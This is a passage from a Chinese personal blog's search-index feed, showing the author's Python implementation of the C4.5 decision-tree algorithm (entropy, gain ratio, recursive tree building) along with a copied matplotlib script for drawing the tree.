class="number">-1</span>)<span class="comment">#计算不同分割点的熵</span></span><br><span class="line">    threshold=[i <span class="keyword">for</span> i,j <span class="keyword">in</span> scrap.items() <span class="keyword">if</span> j == min(scrap.values())][<span class="number">0</span>]<span class="comment">#阈值，增益和熵成反比所以min</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lost_star:</span><br><span class="line">        <span class="comment">#解释一下这个学来的操作，大概就相当于['&gt;=','&lt;'][0 or 1]</span></span><br><span class="line">        <span class="comment">#a cool trick, right? :D</span></span><br><span class="line">        i[l]=[<span class="string">'&gt;='</span>,<span class="string">'&lt;'</span>][float(i[l])&gt;=float(threshold)]+threshold</span><br><span class="line">    <span class="keyword">return</span> lost_star</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entropy</span><span class="params">(lost_star,l)</span>:</span><span class="comment">#计算信息熵  参数：数据集,列数</span></span><br><span class="line">    star=&#123;&#125;</span><br><span class="line">    entropy=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)):</span><br><span class="line">        <span class="keyword">if</span> lost_star[i][l] <span class="keyword">not</span> <span class="keyword">in</span> star.keys(): <span class="comment">#一个字典</span></span><br><span class="line">            star[lost_star[i][l]]=<span class="number">0</span><span class="comment">#key:value = 结果取值:个数</span></span><br><span class="line">        star[lost_star[i][l]]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> star.values():</span><br><span class="line">        entropy += -(i/sum(star.values()))*log(i/sum(star.values()),<span class="number">2</span>)<span class="comment">#熵，∑-p*log2(p)</span></span><br><span class="line">    <span class="keyword">return</span> entropy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gainratio</span><span class="params">(en,e,j,lost_star)</span>:</span><span class="comment">#信息增益率 参数：结果熵,属性熵,列数,数据集</span></span><br><span class="line">    <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    entropy_info=<span class="number">0</span> <span class="comment">#属性∑，即∑|Dv|/D * Entropy(playgolf? in Dv)</span></span><br><span class="line">    a_value=set([lost_star[i][j] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star))])<span class="comment">#属性可能的取值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a_value:</span><br><span class="line">        subset=get_subset(lost_star,i,j)<span class="comment">#得到属性取值对应子集</span></span><br><span class="line">        entropy_info += len(subset)/len(lost_star)*entropy(subset,len(subset[<span class="number">0</span>])<span class="number">-1</span>)<span class="comment">#属性∑ = 取值权重*子集熵</span></span><br><span class="line">    <span class="keyword">return</span> (en - entropy_info)/e    <span class="comment">#（结果熵-属性∑）/属性熵 = gainratio</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gotcha</span><span class="params">(lost_star,attributes,en)</span>:</span><span class="comment">#生成树  参数：数据集，属性，结果熵</span></span><br><span class="line">    <span class="keyword">if</span> en == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> lost_star[<span class="number">0</span>][<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> len(lost_star[<span class="number">0</span>])==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)):</span><br><span class="line">            <span class="keyword">if</span> lost_star[i][<span class="number">-1</span>] <span class="keyword">not</span> <span class="keyword">in</span> star:</span><br><span class="line">                star[lost_star[i][<span class="number">-1</span>]]=<span class="number">0</span></span><br><span class="line">            star[lost_star[i][<span class="number">-1</span>]]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i,j <span class="keyword">in</span> lost_star.items():</span><br><span class="line">            <span class="keyword">if</span> j == max(lost_star.values()):</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">    <span class="comment">#↑如果结果熵是0（结果唯一）或属性只剩一个</span></span><br><span class="line">    dust=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(attributes)):</span><br><span class="line">        dust[attributes[i]]=gainratio(en,entropy(lost_star,i),i,lost_star)<span class="comment">#属性对应信息增益率</span></span><br><span class="line">    <span class="comment">#↓试图压缩行数，写了个智熄操作搞到节点</span></span><br><span class="line">    branch=[i <span class="keyword">for</span> i,j <span class="keyword">in</span> dust.items() <span class="keyword">if</span> j == max(dust.values())][<span class="number">0</span>]</span><br><span class="line">    num=attributes.index(branch)<span class="comment">#得到被选作节点的属性所在列数</span></span><br><span class="line">    <span class="keyword">del</span>(attributes[num])        <span class="comment">#把该属性从属性列表中删除</span></span><br><span class="line">    b_value=set([lost_star[i][num] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star))])<span class="comment">#被选作节点的属性可能的取值</span></span><br><span class="line">    tree=&#123;branch:&#123;&#125;&#125;</span><br><span class="line">    <span class="comment">#写个循环调get_subset拿到属性不同取值对应的子集然后递归</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b_value:</span><br><span class="line">        subset=get_subset(lost_star,i,num)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(len(subset)):</span><br><span class="line">            subset[a].remove(subset[a][num])<span class="comment">#去除被选作节点的属性</span></span><br><span class="line">        entro=entropy(subset,len(subset[<span class="number">0</span>])<span class="number">-1</span>)<span class="comment">#子集的结果熵</span></span><br><span class="line">        subattributes = attributes[:]<span class="comment">#化腐朽为神奇.jpg 如果不备份直接传会炸</span></span><br><span class="line">        tree[branch][i]=gotcha(subset,subattributes,entro)<span class="comment">#拿到下一个节点ry</span></span><br><span class="line">    <span class="keyword">return</span> tree</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    path = <span class="string">r'data.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line"></span><br><span class="line">    attributes,lost_star,en = stardust(data)<span class="comment">#拿到属性，具体数据集和结果熵</span></span><br><span class="line">    tree=gotcha(lost_star,attributes,en)</span><br><span class="line">    print(tree)</span><br></pre></td></tr></table></figure><p>图像代码（复制来的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: cp936 -*-  </span><br><span class="line">import matplotlib.pyplot as plt  </span><br><span class="line">from kadoya import *  #c4.5算法的py文件名</span><br><span class="line">decisionNode = dict(boxstyle = &apos;sawtooth&apos;, fc = &apos;0.8&apos;)  </span><br><span class="line">leafNode = dict(boxstyle = &apos;round4&apos;, fc = &apos;0.8&apos;)  </span><br><span class="line">arrow_args = dict(arrowstyle = &apos;&lt;-&apos;)  </span><br><span class="line">  </span><br><span class="line">def plotNode(nodeTxt, centerPt, parentPt, nodeType):  </span><br><span class="line">    createPlot.ax1.annotate(nodeTxt, xy = parentPt, xycoords = &apos;axes fraction&apos;,xytext = centerPt, textcoords = &apos;axes fraction&apos;,va = &apos;center&apos;, ha = &apos;center&apos;, bbox = nodeType, arrowprops = arrow_args)  </span><br><span class="line">  </span><br><span class="line"># 使用文本注解绘制树节点  </span><br><span class="line">def createPlot():  </span><br><span class="line">    fig = plt.figure(1, facecolor = &apos;white&apos;)  </span><br><span class="line">    fig.clf()  </span><br><span class="line">    createPlot.ax1 = plt.subplot(111, frameon = False)  </span><br><span class="line">    plotNode(&apos;a decision node&apos;, (0.5,0.1), (0.1,0.5), decisionNode)  </span><br><span class="line">    plotNode(&apos;a leaf node&apos;, (0.8, 0.1), (0.3,0.8), leafNode)  </span><br><span class="line">    plt.show()  </span><br><span class="line">  </span><br><span class="line">#获取叶子节点数目和树的层数  </span><br><span class="line">def getNumLeafs(myTree):  </span><br><span class="line">    numLeafs = 0  </span><br><span class="line">    #firstStr = myTree.keys()[0]</span><br><span class="line">    firstSides = list(myTree.keys())</span><br><span class="line">    firstStr = firstSides[0]</span><br><span class="line">    secondDict = myTree[firstStr]  </span><br><span class="line">    for key in secondDict.keys():  </span><br><span class="line">        if(type(secondDict[key]).__name__ == &apos;dict&apos;):  </span><br><span class="line">            numLeafs += getNumLeafs(secondDict[key])  </span><br><span class="line">        else: numLeafs += 1  </span><br><span class="line">    return numLeafs  </span><br><span class="line">  </span><br><span class="line">def getTreeDepth(myTree):  </span><br><span class="line">    maxDepth = 0  </span><br><span class="line">    #firstStr = myTree.keys()[0]</span><br><span class="line">    firstSides = list(myTree.keys())</span><br><span class="line">    firstStr = firstSides[0]</span><br><span class="line">    secondDict = myTree[firstStr]  </span><br><span class="line">    for key in secondDict.keys():  </span><br><span class="line">        if(type(secondDict[key]).__name__ == &apos;dict&apos;):  </span><br><span class="line">            thisDepth = 1+ getTreeDepth(secondDict[key])  </span><br><span class="line">        else: thisDepth = 1  </span><br><span class="line">        if thisDepth &gt; maxDepth: maxDepth = thisDepth  </span><br><span class="line">    return maxDepth  </span><br><span class="line">  </span><br><span class="line">#更新createPlot代码以得到整棵树  </span><br><span class="line">def plotMidText(cntrPt, parentPt, txtString):  </span><br><span class="line">    xMid = (parentPt[0]-cntrPt[0])/2.0 + cntrPt[0]  </span><br><span class="line">    yMid = (parentPt[1]-cntrPt[1])/2.0 + cntrPt[1]  </span><br><span class="line">    createPlot.ax1.text(xMid, yMid, txtString, va=&quot;center&quot;, ha=&quot;center&quot;, rotation=30)  </span><br><span class="line">  </span><br><span class="line">def plotTree(myTree, parentPt, nodeTxt):#if the first key tells you what feat was split on  </span><br><span class="line">    numLeafs = getNumLeafs(myTree)  #this determines the x width of this tree  </span><br><span class="line">    depth = getTreeDepth(myTree)  </span><br><span class="line">    #firstStr = myTree.keys()[0]     #the text label for this node should be this</span><br><span class="line">    firstSides = list(myTree.keys())</span><br><span class="line">    firstStr = firstSides[0]</span><br><span class="line">    cntrPt = (plotTree.xOff + (1.0 + float(numLeafs))/2.0/plotTree.totalW, plotTree.yOff)  </span><br><span class="line">    plotMidText(cntrPt, parentPt, nodeTxt)  </span><br><span class="line">    plotNode(firstStr, cntrPt, parentPt, decisionNode)  </span><br><span class="line">    secondDict = myTree[firstStr]  </span><br><span class="line">    plotTree.yOff = plotTree.yOff - 1.0/plotTree.totalD  </span><br><span class="line">    for key in secondDict.keys():  </span><br><span class="line">        if type(secondDict[key]).__name__==&apos;dict&apos;:#test to see if the nodes are dictonaires, if not they are leaf nodes     </span><br><span class="line">            plotTree(secondDict[key],cntrPt,str(key))        #recursion  </span><br><span class="line">        else:   #it&apos;s a leaf node print the leaf node  </span><br><span class="line">            plotTree.xOff = plotTree.xOff + 1.0/plotTree.totalW  </span><br><span class="line">            plotNode(secondDict[key], (plotTree.xOff, plotTree.yOff), cntrPt, leafNode)  </span><br><span class="line">            plotMidText((plotTree.xOff, plotTree.yOff), cntrPt, str(key))  </span><br><span class="line">    plotTree.yOff = plotTree.yOff + 1.0/plotTree.totalD  </span><br><span class="line">#if you do get a dictonary you know it&apos;s a tree, and the first element will be another dict  </span><br><span class="line">  </span><br><span class="line">def createPlot(inTree):  </span><br><span class="line">    fig = plt.figure(1, facecolor=&apos;white&apos;)  </span><br><span class="line">    fig.clf()  </span><br><span class="line">    axprops = dict(xticks=[], yticks=[])  </span><br><span class="line">    createPlot.ax1 = plt.subplot(111, frameon=False, **axprops)    #no ticks  </span><br><span class="line">    #createPlot.ax1 = plt.subplot(111, frameon=False) #ticks for demo puropses   </span><br><span class="line">    plotTree.totalW = float(getNumLeafs(inTree))  </span><br><span class="line">    plotTree.totalD = float(getTreeDepth(inTree))  </span><br><span class="line">    plotTree.xOff = -0.5/plotTree.totalW; plotTree.yOff = 1.0;  </span><br><span class="line">    plotTree(inTree, (0.5,1.0), &apos;&apos;)  </span><br><span class="line">    plt.show() </span><br><span class="line"></span><br><span class="line">path = r&apos;data.txt&apos;</span><br><span class="line">with open(path) as f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">attributes,lost_star,en = stardust(data)#拿到具体数据集和结果熵</span><br><span class="line">tree=gotcha(lost_star,attributes,en)</span><br><span class="line">print(tree)</span><br><span class="line">createPlot(tree)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
